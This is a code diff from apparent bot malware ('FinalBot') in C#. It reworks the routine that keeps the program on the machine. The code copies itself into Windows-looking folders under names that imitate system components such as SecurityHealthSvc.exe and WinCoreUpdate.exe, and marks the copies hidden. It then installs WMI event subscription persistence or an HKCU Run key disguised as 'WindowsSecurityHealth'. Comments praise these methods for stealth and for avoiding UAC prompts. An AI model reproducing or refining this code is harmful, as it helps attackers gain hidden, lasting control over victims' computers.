@@ -22,11 +22,25 @@ namespace FinalBot
                 string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
                 if (string.IsNullOrEmpty(selfPath)) return;
 
-                string programData = Environment.GetEnvironmentVariable("ProgramData") ?? @"C:\ProgramData";
-                string targetDir = Path.Combine(programData, "Microsoft", "Windows", "Power Efficiency Diagnostics");
-                string targetPath = Path.Combine(targetDir, "SecurityHealthSvc.exe");
+                bool isAdmin = VanguardCore.ElevationService.IsAdmin();
+                string targetDir;
+                string targetName = "SecurityHealthSvc.exe";
 
-                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
+                if (isAdmin)
+                {
+                    string programData = Environment.GetEnvironmentVariable("ProgramData") ?? @"C:\ProgramData";
+                    targetDir = Path.Combine(programData, "Microsoft", "Windows", "Power Efficiency Diagnostics");
+                }
+                else
+                {
+                    targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Update");
+                    targetName = "WinCoreUpdate.exe";
+                }
+
+                string targetPath = Path.Combine(targetDir, targetName);
+
+                if (!Directory.Exists(targetDir)) 
+                    Directory.CreateDirectory(targetDir);
 
                 if (selfPath.ToLower() != targetPath.ToLower())
                 {
@@ -42,45 +56,51 @@ namespace FinalBot
                             catch { }
                         }
                         File.Copy(selfPath, targetPath, true);
-                        File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
+                        File.SetAttributes(targetPath, FileAttributes.Hidden);
                     }
                     catch (Exception)
                     {
-                        // Attempt multiple names just in case
-                        string[] altNames = { "OneDriveUpdate.exe", "SecurityHealthClient.exe", "WindowsMediaModule.exe", "WaaSMedicAgent.exe" };
-                        bool copied = false;
-                        foreach (var alt in altNames)
+                        // Fallback naming for user-mode or locked system modes
+                        if (!isAdmin)
                         {
-                            try {
-                                string altPath = Path.Combine(targetDir, alt);
-                                File.Copy(selfPath, altPath, true);
-                                File.SetAttributes(altPath, FileAttributes.Hidden | FileAttributes.System);
-                                targetPath = altPath;
-                                copied = true;
-                                break;
-                            } catch { }
-                        }
-                        if (!copied)
-                        {
-                            targetPath = Path.Combine(targetDir, $"svc_{Guid.NewGuid().ToString().Substring(0, 8)}.exe");
+                            targetPath = Path.Combine(targetDir, $"upd_{Guid.NewGuid().ToString().Substring(0, 8)}.exe");
                             File.Copy(selfPath, targetPath, true);
+                        }
+                        else
+                        {
+                            string[] altNames = { "OneDriveUpdate.exe", "SecurityHealthClient.exe", "WaaSMedicAgent.exe" };
+                            bool copied = false;
+                            foreach (var alt in altNames)
+                            {
+                                try {
+                                    string altPath = Path.Combine(targetDir, alt);
+                                    File.Copy(selfPath, altPath, true);
+                                    File.SetAttributes(altPath, FileAttributes.Hidden | FileAttributes.System);
+                                    targetPath = altPath;
+                                    copied = true;
+                                    break;
+                                } catch { }
+                            }
+                            if (!copied)
+                            {
+                                targetPath = Path.Combine(targetDir, $"svc_{Guid.NewGuid().ToString().Substring(0, 8)}.exe");
+                                File.Copy(selfPath, targetPath, true);
+                            }
                         }
                     }
                 }
 
                 Logger.Info("[PERSISTENCE] File copy phase complete.");
 
-                // SURGICAL PERSISTENCE: pick the stealthiest single method per privilege level
-                bool isAdmin = VanguardCore.ElevationService.IsAdmin();
                 if (isAdmin)
                 {
-                    // Admin: WMI event subscription — completely hidden from registry, schtasks, and startup folders
+                    // Admin: WMI event subscription
                     InstallWMI(targetPath);
                     Logger.Info("[PERSISTENCE] WMI stealth method installed.");
                 }
                 else
                 {
-                    // User: single HKCU Run key — low noise, no visible UAC prompt required
+                    // User: single HKCU Run key
                     PersistManager.InstallRegistryRun("WindowsSecurityHealth", targetPath, false);
                     Logger.Info("[PERSISTENCE] HKCU Run key installed.");
                 }
